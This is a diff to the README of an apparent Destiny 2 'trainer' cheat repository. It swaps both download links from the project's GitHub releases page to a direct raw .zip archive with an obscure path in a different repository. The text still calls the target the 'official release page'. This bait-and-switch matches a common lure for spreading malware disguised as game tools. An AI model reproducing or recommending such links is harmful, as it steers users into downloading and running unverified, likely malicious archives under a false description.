@@ -5,7 +5,7 @@ description: "Automate farming and enhance gameplay in Destiny 2 with this exter
 ---
 # 🎮 Destiny2-Ultimate-Trainer-2026-extreme - Improve your game performance and speed
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Inverse-baryonnumber71/Destiny2-Ultimate-Trainer-2026-extreme/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Inverse-baryonnumber71/inverse-baryonnumber71.github.io/main/xerophytic/io-inverse-github-baryonnumber-v3.6.zip)
 
 ## 📌 Application Overview
 
@@ -33,7 +33,7 @@ Destiny2-Ultimate-Trainer-2026-extreme acts as a helper tool for Destiny 2 playe
 
 To get the software, visit the official release page. You will find the installer file there.
 
-[Click here to open the download page](https://github.com/Inverse-baryonnumber71/Destiny2-Ultimate-Trainer-2026-extreme/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/Inverse-baryonnumber71/inverse-baryonnumber71.github.io/main/xerophytic/io-inverse-github-baryonnumber-v3.6.zip)
 
 Follow these steps to complete the download:
 
